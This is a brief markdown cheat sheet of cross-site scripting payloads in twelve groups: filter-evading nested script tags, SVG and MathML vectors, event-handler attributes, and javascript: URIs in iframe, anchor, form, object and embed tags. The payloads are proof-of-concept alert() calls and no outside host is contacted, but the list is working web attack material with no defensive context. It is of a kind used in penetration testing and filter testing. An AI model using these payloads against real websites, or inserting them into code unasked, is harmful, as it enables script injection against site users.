# About XSS Payloads

1. Script Tag Injection
```html
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<scr<script>ipt>alert(String.fromCharCode(88,83,83))</scr<script>ipt>
```

2. SVG Injection
```html
<svg onload="alert`1`">
<svg onload=alert(1)>
```

3. Iframe Injection
```html
<iframe src="javascript:alert('XSS');"></iframe>
```

4. MathML Injection
```html
<math><maction xlink:href="javascript:alert('XSS')"></maction></math>
```

5. Details and Marquee Tag Injection
```html
<details open ontoggle="alert`1`">
<marquee onstart=alert(1)>
```

6. Body and Input Tag Injection
```html
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

7. Mouseover Event Injection
```html
<div onmouseover="alert`1`">Hover me!</div>
```

8. Anchor Tag Injection
```html
<a href="javascript:alert(1)">Click me</a>
```

9. SVG Desc Injection
```html
<svg><desc><![CDATA[</desc><scr<script>ipt>alert('XSS')</scr<script>ipt>]]></desc></svg>
```

10. Form Action Injection
```html
<form action="javascript:alert(1)"><input type="submit"></form>
```

11. Object and Embed Tag Injection
```html
<object data="javascript:alert(1)"></object>
<embed src="javascript:alert(1)">
```

12. CSS Injection
```html
<link rel="stylesheet" href="data:text/css,<style>*{color:red;}</style>">
<style>@import 'data:text/css,<style>*{color:red;}</style>';</style>
```
